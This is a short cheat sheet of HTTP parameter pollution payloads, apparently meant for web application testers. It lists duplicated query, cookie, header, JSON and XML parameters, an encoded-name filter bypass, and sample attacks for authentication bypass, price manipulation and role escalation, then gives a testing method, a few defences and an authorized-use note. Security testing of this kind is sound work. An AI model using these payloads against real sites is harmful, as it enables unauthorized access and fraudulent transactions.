# HTTP Parameter Pollution (HPP) Payload Cheat Sheet

Parameter pollution occurs when multiple parameters with the same name are passed to a web application, potentially causing unexpected behavior. Below are various HPP payloads for testing and exploitation.

## Basic Payloads

```
?param=value1&param=value2
?param[]=value1&param[]=value2
?param=value1&param=
```

## URL-Encoded Payloads

```
?param=value1%26param%3Dvalue2
?param=value1%3Bparam%3Dvalue2
```

## Special Character Payloads

```
?param=value1&param=value2#
?param=value1&param=value2?
?param=value1/*&param=value2*/
```

## Header-Based HPP

```
Cookie: param=value1; param=value2
User-Agent: Mozilla/5.0 (param=value1&param=value2)
```

## JSON Parameter Pollution

```json
{
  "param": ["value1", "value2"],
  "param": "value3"
}
```

## XML Parameter Pollution

```xml
<root>
  <param>value1</param>
  <param>value2</param>
</root>
```

## HTTP Method Variations

```
POST /endpoint HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

param=value1&param=value2
```

## Bypass Techniques

```
?param=value1&%70%61%72%61%6d=value2  // URL-encoded param name
?param=value1&param=value2&other=test
?param=value1&other=test&param=value2
```

## Impactful Scenarios

1. **Authentication Bypass**:
   ```
   ?username=admin&username=user&password=12345
   ```

2. **Price Manipulation**:
   ```
   ?price=100&price=1
   ```

3. **Access Control**:
   ```
   ?role=user&role=admin
   ```

## Testing Methodology

1. Identify all parameters in the request
2. Duplicate each parameter with different values
3. Test different positions (first, last, middle)
4. Test with different separators (&, ;, %26)
5. Test with different content-types (form, JSON, XML)

## Defense Mechanisms

- Use the first/last occurrence consistently
- Reject requests with duplicate parameters
- Normalize parameter names before processing
- Implement strict parameter validation

Note: Always test these payloads in authorized environments only. Unauthorized testing may violate laws and ethical guidelines.